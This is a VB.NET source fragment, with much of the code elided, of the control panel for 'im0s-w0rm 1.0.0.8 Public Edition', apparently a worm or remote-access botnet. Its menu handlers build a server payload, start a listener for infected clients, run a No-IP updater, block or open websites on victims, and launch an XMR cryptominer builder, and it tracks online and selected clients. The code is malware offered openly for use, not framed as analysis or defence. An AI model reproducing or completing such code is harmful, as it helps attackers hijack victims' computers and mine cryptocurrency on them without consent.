Public Class Form1
    ...
    Public vr As String = "Online[ xxx ] Sel[ sss ]"
    ...
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Label1.Text = vr.Replace("xxx", L1.Items.Count).Replace("port", k).Replace("sss", L1.SelectedItems.Count)
        Label2.Text = "im0s-w0rm 1.0.0.8 Public Edition"
    End Sub
    ...
    Private Sub BlockWebsiteToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles BlockWebsiteToolStripMenuItem1.Click
        Try
    ...
    Private Sub OpenWebSiteToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles OpenWebSiteToolStripMenuItem1.Click
        Try
    ...
    Private Sub BuildServerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuildServerToolStripMenuItem.Click
        Control.CheckForIllegalCrossThreadCalls = False
        Try
            S = New Listner(k)
            BuildServerToolStripMenuItem.Enabled = False
        Catch ex As Exception
    ...
    Private Sub NoIPUpdaterToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NoIPUpdaterToolStripMenuItem.Click
        Dim nopip As New Form6
        nopip.Show()
    End Sub

    Private Sub StartListenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartListenToolStripMenuItem.Click
        Form2.Show()
    End Sub
    ...
    Private Sub XMRMinerBuilderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles XMRMinerBuilderToolStripMenuItem.Click
        Form7.Show()
    End Sub
